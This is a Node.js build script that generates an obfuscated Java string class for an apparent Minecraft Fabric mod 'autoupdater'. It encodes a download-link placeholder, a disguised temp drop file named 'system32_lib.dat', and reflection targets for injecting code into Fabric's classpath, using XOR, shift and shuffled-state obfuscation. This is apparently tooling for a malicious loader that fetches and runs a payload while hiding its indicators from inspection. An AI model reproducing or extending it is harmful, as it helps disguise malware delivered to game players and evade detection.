const fs = require('fs');

const strings = {
    URL: "DOWNLOAD_LINK",
    TMPDIR: "java.io.tmpdir",
    JNA: "/jna_tmp_x86",
    SYSDAT: "system32_lib.dat",
    DEPS: "deps",
    FABRIC_JSON: "fabric.mod.json",
    JARS: "jars",
    FILE: "file",
    DELEGATE: "delegate",
    ADD_CODE_SOURCE: "addCodeSource",
    LAUNCHER_BASE: "net.fabricmc.loader.impl.launch.FabricLauncherBase",
    GET_LAUNCHER: "getLauncher",
    ADD_TO_CP: "addToClassPath",
    ADD_URL_FWD: "addUrlFwd",
    MIXINS: "mixins",
    CONFIG: "config",
    ENTRYPOINTS: "entrypoints",
    MAIN: "main",
    CLIENT: "client",
    VALUE: "value",
    ON_INIT: "onInitialize",
    ON_INIT_CLIENT: "onInitializeClient"
};

let javaCode = `package de.packetpisser.autoupdater;\n\npublic class S {\n`;

for (const [key, value] of Object.entries(strings)) {
    let states = Array.from({length: value.length}, (_, i) => i);

    for (let i = states.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [states[i], states[j]] = [states[j], states[i]];
    }

    javaCode += `    public static String ${key}() {\n`;
    javaCode += `        char[] c = new char[${value.length}];\n`;
    javaCode += `        int state = ${states[0]};\n`;
    javaCode += `        while(state != -1) {\n`;
    javaCode += `            switch(state) {\n`;
    
    for (let i = 0; i < value.length; i++) {
        const currState = states[i];
        const nextState = i === value.length - 1 ? -1 : states[i + 1];
        const charCode = value.charCodeAt(i);
        const shift = Math.floor(Math.random() * 5) + 1;
        const mask = Math.floor(Math.random() * 255);
        const obfuscatedChar = (charCode ^ mask) << shift;
        
        javaCode += `                case ${currState}:\n`;
        javaCode += `                    c[${i}] = (char) ((${obfuscatedChar} >> ${shift}) ^ ${mask});\n`;
        javaCode += `                    state = ${nextState};\n`;
        javaCode += `                    break;\n`;
    }
    
    javaCode += `            }\n        }\n        return new String(c);\n    }\n`;
}

javaCode += `}\n`;

fs.writeFileSync('src/main/java/de/packetpisser/autoupdater/S.java', javaCode);
console.log("S.java generated.");